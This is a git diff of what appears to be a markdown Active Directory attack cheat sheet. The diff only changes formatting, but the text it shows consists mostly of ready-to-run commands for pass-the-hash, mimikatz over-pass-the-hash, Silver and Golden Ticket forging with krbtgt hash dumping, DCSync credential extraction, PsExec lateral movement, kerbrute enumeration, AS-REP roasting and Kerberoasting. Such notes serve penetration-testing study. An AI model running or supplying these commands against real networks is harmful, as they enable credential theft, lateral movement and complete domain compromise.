@@ -57,13 +57,13 @@ evil-winrm -i <IP> -u <user> -H <hash>
 
 `Over Pass the Hash`
 
--> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
+- Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
 
 ```
 mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
 ```
 
--> Command execution with psexec  
+- Command execution with psexec  
 ```
 .\PsExec.exe \\<hostname> cmd.exe
 ```
@@ -77,9 +77,9 @@ impersonate_token <token>
 ```
 
 ### Silver Ticket - Pass the Ticket
--> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
+- It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
 
--> Get SID
+- Get SID
 ```
 GetDomainsid (PowerView)
 ```
@@ -87,11 +87,11 @@ or
 ```
 whoami /user
 ```
--> Get Machine Account Hash
+- Get Machine Account Hash
 ```
 Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
 ```
--> Exploitation mimikatz.exe
+- Exploitation mimikatz.exe
 ```
 kerberos::purge
 kerberos::list
@@ -104,13 +104,13 @@ kerberos::list
 ```
 
 ### Golden Ticket - Pass the Ticket
--> It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
+- It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
 
--> Get hash krbtgt
+- Get hash krbtgt
 ```
 ./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
 ```
--> Get SID
+- Get SID
 ```
 GetDomainsid (PowerView)
 ```
@@ -119,7 +119,7 @@ or
 whoami /user
 ```
 
--> Exploitation
+- Exploitation
 ```
 mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"
 
@@ -127,13 +127,13 @@ psexec.exe \\dc1 cmd.exe
 ```
 
 ### DCSync Attack
--> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
+- The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
 ```
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
-## AS-REP Roasting Attack - not require Pre-Authentication
--> kerbrute - Enumeration Users
+### AS-REP Roasting Attack - not require Pre-Authentication
+- kerbrute - Enumeration Users
 ```
 kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
 ```
@@ -144,8 +144,8 @@ https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userl
 impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
 ```
 
-## Kerberoast
--> impacket-GetUserSPNs
+### Kerberoast
+- impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
 ```
